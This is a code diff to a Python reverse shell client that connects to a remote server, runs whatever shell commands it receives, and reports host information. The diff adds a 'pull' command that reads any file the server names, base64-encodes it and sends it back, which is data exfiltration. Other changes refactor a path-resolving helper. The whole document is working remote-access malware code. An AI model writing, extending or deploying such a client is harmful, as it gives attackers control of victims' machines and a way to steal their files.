@@ -1,4 +1,5 @@
 import asyncio
+import base64
 import getpass
 import hashlib
 import hmac
@@ -13,6 +14,17 @@ from sysInfo import TargetSysInfo
 # Configuration: Server address and port for the reverse shell connection
 SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 1234
+
+
+def resolve_path(path: str) -> str:
+    """
+    Resolves the path to an absolute path, handling user home (~) and empty input.
+    """
+    if not path:
+        return str(Path.home())
+    if path.startswith('~'):
+        return str(Path(path).expanduser())
+    return str(Path(path).absolute())
 
 
 class ReverseShellClient:
@@ -71,7 +83,7 @@ class ReverseShellClient:
         }
         return json.dumps(data, indent=4).encode()
 
-    async def run_process(self,command):
+    async def run_process(self, command):
         # Execute shell command asynchronously
         process = await asyncio.create_subprocess_shell(
             command,
@@ -94,16 +106,6 @@ class ReverseShellClient:
         length = struct.pack(">I", len(data))
         self.writer.write(length + data)
         await self.writer.drain()
-
-    def resolve_path(self, path: str) -> str:
-        """
-        Resolves the path to an absolute path, handling user home (~) and empty input.
-        """
-        if not path:
-            return str(Path.home())
-        if path.startswith('~'):
-            return str(Path(path).expanduser())
-        return str(Path(path).absolute())
 
     async def connect_and_listen(self):
         """
@@ -129,7 +131,8 @@ class ReverseShellClient:
                 header = await self.reader.readexactly(4)
                 length = struct.unpack(">I", header)[0]
                 data = await self.reader.read(length)
-                command = json.loads(data)['cmd']
+                data = json.loads(data)
+                command = data['cmd'].strip()
 
                 if not command:
                     print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
@@ -141,11 +144,27 @@ class ReverseShellClient:
                     await self.send_output(self.setup_data(stdout=self.client_info.__str__()))
                     continue
 
+                if command == "pull":
+                    file = resolve_path(data['file'])
+                    try:
+                        with open(file, 'rb') as f:
+                            fdata = f.read()
+                            encoded_data = base64.b64encode(fdata).decode('ascii')
+                            dtype = json.dumps({'name': Path(file).name, 'extension': Path(file).suffix,'data':encoded_data})
+                            await self.send_output(
+                                self.setup_data(stdout='', dtype=dtype))
+                    except IsADirectoryError:
+                        await self.send_output(self.setup_data(stderr=f'{file} is a Directory', stdout=''))
+                    except PermissionError as e:
+                        await self.send_output(self.setup_data(stdout='', stderr=f'Permission denied: {file}'))
+                    except FileNotFoundError:
+                        await self.send_output(self.setup_data(stderr=f'No such file: {file}', stdout=''))
+                    continue
                 try:
                     # Handle change directory (cd) command
                     if command.startswith("cd ") or command == "cd":
                         print('[-] Changing directory. Before:', os.getcwd())
-                        os.chdir(self.resolve_path(command[3:]))
+                        os.chdir(resolve_path(command[3:]))
                         self.current_directory = os.getcwd()
                         response = f"[+] Changed directory to: {self.current_directory}"
                         print('[+] After:', os.getcwd())
